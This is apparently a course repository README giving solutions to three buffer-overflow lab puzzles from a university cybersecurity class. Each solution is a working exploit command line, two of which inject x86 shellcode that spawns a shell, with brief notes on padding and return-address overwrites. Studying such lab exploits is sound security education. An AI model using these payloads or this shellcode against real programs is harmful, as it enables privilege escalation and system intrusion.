# Emory Fall 2019: CS453: Cybersecurity

The labs are on platform.adversary.io. They consisted of binary bombs, web exploit exercises, and binary exploits.
This folder only contains the binary exploit puzzles and their solutions.

## Overflow 1

Solution:__
./overflow aaaabbbbccccdddd$(perl -e 'print "\x48\x43\x4b\x52"')__
Pretty standard overflow: just had to input the location for secret after filling up the buffer.


## Overflow 2

Solution:__
$(perl -e 'print "\x90" x (256-40)')$(perl -e 'print "\xeb\x18\x5b\xb8\xf5\xff\xff\xff\xf7\xd8\x31\xd2\x88\x53\x07\x89\x5b\x08\x89\x53\x0c\x8d\x4b\x08\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x43\x43" ')AAAAAAAAAAAA$(perl -e 'print "\xe8\xd4\xff\xff"')__
The idea is to fill up the buffer, leaving 40 bytes of room for the shellcode. Then, overwrite the ebp, and return into the buffer. Some extra padding was used for stack alignment. 

## Chained Overflow
Solution:__
echo $(perl -e 'printf "\x11" x 4')$(perl -e 'print "\x90" x 3812')$(perl -e 'print "\x90" x (256-55)')$(printf "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xeb\x18\x5b\xb8\xf5\xff\xff\xff\xf7\xd8\x31\xd2\x88\x53\x07\x89\x5b\x08\x89\x53\x0c\x8d\x4b\x08\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x43\x45")$(printf "\x97\x6c\x6c\xe8\xd4\xff\xff") > temp.hex__
cat temp.hex - | ./overflow RUSHKEKEKE$(perl -e 'printf "\x2e"x9')$(printf "\x34\xa9\x87\x04\x08")
run RUSHKEKEKE$(perl -e 'printf "\x2e"x9')$(printf "\x34\xa9\x87\x04\x08") < temp.hex__
This was a hard one.
